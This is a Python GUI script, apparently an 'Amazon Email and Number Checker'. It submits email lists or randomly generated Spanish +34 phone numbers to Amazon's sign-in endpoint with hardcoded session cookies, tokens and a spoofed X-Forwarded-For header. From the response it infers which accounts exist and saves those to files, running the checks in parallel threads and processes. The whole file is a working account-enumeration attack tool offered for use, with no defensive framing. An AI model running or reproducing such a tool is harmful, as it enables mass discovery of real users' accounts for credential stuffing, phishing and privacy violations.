import requests
import random
from tkinter import Tk, Label, Button, filedialog, Text, Scrollbar, VERTICAL, RIGHT, Y, LEFT, BOTH, END, Entry, messagebox
from tkinter import ttk
import threading
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
import signal
import sys

requests.packages.urllib3.disable_warnings()

class Amazon:
    def __init__(self, num):
        self.url = "https://www.amazon.com/ap/signin"
        self.num = num

    def check(self):
        cookies = {
            "session-id": "134-5888677-5082766",
            "session-id-time": "2347294707l",
            "i18n-prefs": "USD",
            "csm-hit": "tb:Q76FPDADJWBXBDM2Z676+s-4PKF6AMM1FK89W6MZYX9|1716574702794&t:1716574702794&adb:adblk_yes",
            "ubid-main": "131-2205767-2293117",
            "session-token": "2bpZkWCCLpCI1rzdxMVY8EcbBTPY7in8WG6wTURWnddB6WmUjYdMO88o7HQXtea5BHUye+6Pqnzimq6JrrB+R8cmMcoD31RFxypnO9TqgCLt9aKiqdtBF2yXQ/4ga/+4zTdKBxIuRa8ALDPIj838yW89GMkfcEw4OYSctpIdvpBMyo4Jygf+pxOIOPpSnu2EP+VOytmyisRsDCTzG4ai+ALwSlesIUQzdSS4/lyGHv+XQFa2MaDQu4EyH1G4QyV9IOKPuc0W68N6RQp2SBqS4n+4F77Kg4h+qzh8wu4Ek0N/N2QTWvUb5ylnVroxq55xpEXcLV7wQwq+Uifs6HjlUqdfZBkxWZtm"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.amazon.com",
            "Connection": "keep-alive",
            "X-Forwarded-For": "127.0.0.1",
            "Referer": "https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0",
            "Upgrade-Insecure-Requests": "1",
        }
        data = {
            "appActionToken": "BH7iyYf3fWdjVFxIj2BbcyuY8ktI0j3D",
            "appAction": "SIGNIN_PWD_COLLECT",
            "subPageType": "SignInClaimCollect",
            "openid.return_to": "ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS8/cmVmXz1uYXZfeWFfc2lnbmlu",
            "prevRID": "ape:UFlCSjNXRjYyREFESDVKU1NCMk4=",
            "workflowState": "eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.7H5pkhZ3NJ9mreA7ZjGYrUyXl8eCeuDZUdNShk4gYzRoKbt_EBzJ-w.bjFvKRdCh_Vb3W87.WEKkGLBkHQ_RHkTa13-EU6Jem7Z0lZ0_CSKBePm5hvBTWTDQIxdE0ODmx-mdJ5TerFoHC7YnfuxIrmM7FGTLv4qk0F9SlaJNNRXjC69-yDCRMIa4fY3Roxrh827tHid-4fxWo_kjfvVEGaWStaMYoKr0umovEOr0KHAFBwn_SLZMFbmLNNP1skhPx4e5rI-5wucNePt-KUiAruSzdxp3mV28ds29rtMiKxohVQY5-DTLQK_SAcesgD4WUvTNw_o125W69cva5NdKHQ86NSE0pPzJbyRkpLS4lRSz2I5jXGgjAoh0-jkYgfO9iIP6SgtkFxcS1mZSG_QqLfYWR_Wj6etncCUzXKuFBwygsUlVoMyOU-qjru0uKmqM7259ZY2E1A3SpZRC1BvBgJj-Ooqie5OVJN2oxLXMbVJPOW4VlRXO9L9EzCG_hvrhwezGtPYPw2T3pyHJBGzY8R3p7-RONrd9yLlEV4Y1IDcFf5ngxNa-MZ3C_S7yZnDk.5XX3HAWrd9v6vVOrVaB3CA",
            "email": self.num,
            "password": '',
            "create": "0",
        }
        res = requests.post(self.url, headers=headers, cookies=cookies, data=data).text

        if "ap_change_login_claim" in res:
            return True, res
        elif "There was a problem" in res:
            return False, res
        else:
            return False, res

def fun_action(num, text_widget, stop_event):
    num = num.strip()
    if num.isnumeric() and "+" not in num:
        num = "+%s" % num
    while not stop_event.is_set():
        try:
            A, Error = Amazon(num).check()
            if A:
                with open("Valid.txt", "a") as ff:
                    ff.write("%s\n" % num)
                text_widget.insert(END, "[+] Yes ==> %s\n" % num)
                text_widget.see(END)
                break
            else:
                text_widget.insert(END, "[-] No ==> %s\n" % num)
                text_widget.see(END)
                break
        except Exception as e:
            text_widget.insert(END, "[!] Error ==> %s\n" % str(e))
            text_widget.see(END)
            break

def generate_and_check_numbers(text_widget, stop_event, num_cores):
    generated_numbers = set()
    
    with ProcessPoolExecutor(max_workers=num_cores) as executor:
        futures = []
        batch_size = 1000  # Batch size
        total_numbers = 10000000  # Total numbers to generate
        try:
            while len(generated_numbers) < total_numbers:
                if stop_event.is_set():
                    print("Stopped by stop_event")
                    break
                batch_generated = 0
                while batch_generated < batch_size and len(generated_numbers) < total_numbers:
                    num = random.randint(600000000, 699999999)
                    if num in generated_numbers:
                        continue
                    generated_numbers.add(num)
                    phone_number = f"+34{num}"
                    futures.append(executor.submit(Amazon(phone_number).check))
                    batch_generated += 1

                for future in as_completed(futures):
                    if stop_event.is_set():
                        print("Stopped by stop_event during future wait")
                        break
                    try:
                        result, _ = future.result()
                        if result:
                            text_widget.insert(END, f"[+] Yes ==> {phone_number}\n")
                            with open("ValidSpain.txt", "a") as ff:
                                ff.write(f"{phone_number}\n")
                        else:
                            text_widget.insert(END, f"[-] No ==> {phone_number}\n")
                    except Exception as e:
                        text_widget.insert(END, f"[!] Error ==> {str(e)}\n")
                    text_widget.see(END)
                futures.clear()  # Clear futures after processing the batch
        finally:
            executor.shutdown(wait=True, cancel_futures=True)
        print("Number generation completed or stopped")

def main(emails, text_widget, stop_event, num_cores):
    results = []
    with ThreadPoolExecutor(max_workers=num_cores) as executor:
        futures = [executor.submit(fun_action, email, text_widget, stop_event) for email in emails]
        for future in as_completed(futures):
            results.append(future.result())
    return results

def browse_file():
    filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    if filename:
        with open(filename, "r", encoding="Latin-1") as file:
            emails = file.read().splitlines()
            result_text.delete(1.0, END)
            global stop_event
            stop_event.clear()
            try:
                num_cores = int(core_entry.get())
                if num_cores < 1:
                    raise ValueError("The number of cores must be at least 1.")
                threading.Thread(target=main, args=(emails, result_text, stop_event, num_cores)).start()
            except ValueError as e:
                messagebox.showerror("Invalid Input", str(e))

def generate_numbers():
    result_text.delete(1.0, END)
    global stop_event
    stop_event.clear()
    try:
        num_cores = int(core_entry.get())
        if num_cores < 1:
            raise ValueError("The number of cores must be at least 1.")
        print("Starting number generation with", num_cores, "cores")
        threading.Thread(target=generate_and_check_numbers, args=(result_text, stop_event, num_cores)).start()
    except ValueError as e:
        messagebox.showerror("Invalid Input", str(e))

def cancel_operations():
    global stop_event
    stop_event.set()
    print("Operations canceled")

def on_closing():
    cancel_operations()
    for thread in threading.enumerate():
        if thread != threading.main_thread():
            thread.join()
    root.destroy()
    sys.exit()

if __name__ == "__main__":
    root = Tk()
    root.title("Amazon Email and Number Checker")

    style = ttk.Style()
    style.theme_use("clam")

    style.configure("TButton", font=("Helvetica", 12), background="#4CAF50", foreground="white", padding=10)
    style.map("TButton", background=[("active", "#45a049")])

    style.configure("TLabel", font=("Helvetica", 16), padding=10)
    style.configure("TFrame", background="#f2f2f2")

    frame = ttk.Frame(root, padding="10")
    frame.pack(fill="both", expand=True)

    label = ttk.Label(frame, text="Amazon Email and Number Checker")
    label.pack(pady=10)

    core_label = ttk.Label(frame, text="Number of Cores")
    core_label.pack(pady=10)

    core_entry = Entry(frame)
    core_entry.pack(pady=10)

    browse_button = ttk.Button(frame, text="Browse Email List", command=browse_file)
    browse_button.pack(pady=10)

    generate_button = ttk.Button(frame, text="Generate +34 Numbers", command=generate_numbers)
    generate_button.pack(pady=10)

    cancel_button = ttk.Button(frame, text="Cancel Operations", command=cancel_operations)
    cancel_button.pack(pady=10)

    result_frame = ttk.Frame(frame)
    result_frame.pack(fill="both", expand=True)

    scrollbar = Scrollbar(result_frame, orient=VERTICAL)
    result_text = Text(result_frame, height=20, width=50, yscrollcommand=scrollbar.set, wrap="none", font=("Helvetica", 12), bg="#e0e0e0", fg="#000")
    scrollbar.config(command=result_text.yview)
    scrollbar.pack(side=RIGHT, fill=Y)
    result_text.pack(side=LEFT, fill=BOTH, expand=True)

    stop_event = threading.Event()

    root.protocol("WM_DELETE_WINDOW", on_closing)

    root.mainloop()
